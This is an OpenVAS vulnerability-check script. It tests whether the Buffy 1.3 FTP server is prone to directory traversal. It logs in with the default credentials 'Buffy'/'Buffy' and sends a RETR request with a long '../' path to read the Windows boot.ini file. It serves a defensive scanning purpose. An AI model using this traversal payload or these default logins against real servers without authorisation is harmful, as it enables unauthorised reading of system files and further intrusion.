###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_buffy_44577.nasl 13613 2019-02-12 16:12:57Z cfischer $
#
# Buffy 'comb' Command Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100886");
  script_version("$Revision: 13613 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 17:12:57 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-11-02 13:46:58 +0100 (Tue, 02 Nov 2010)");
  script_bugtraq_id(44577);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Buffy 'comb' Command Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/44577");
  script_xref(name:"URL", value:"http://www.smotricz.com/opensource/buffy/Buffy.zip");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/buffy/detected");

  script_tag(name:"summary", value:"Buffy is prone to a directory-traversal vulnerability because it fails
  to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to download and delete
  local files in the context of the webserver process which may aid in further attacks.");

  script_tag(name:"affected", value:"Buffy 1.3 is vulnerable. Prior versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);
banner = get_ftp_banner(port:port);
if(! banner || "Buffy" >!< banner)
  exit(0);

soc1 = open_sock_tcp(port);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds(default_login:"Buffy", default_pass:"Buffy");
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(port));
    if(soc2) {
      file = "../../../../../../../../../../../../../../../../boot.ini";
      attackreq = string("RETR ", file);
      send(socket:soc1, data:string(attackreq, "\r\n"));
      attackres = ftp_recv_data(socket:soc2);
      close(soc2);
    }
  }

  if(attackres && egrep(pattern:"\[boot loader\]" , string: attackres)) {
   security_message(port:port);
   ftp_close(socket:soc1);
   close(soc1);
   exit(0);
  }

 ftp_close(socket:soc1);
 close(soc1);
 exit(0);
}

exit(0);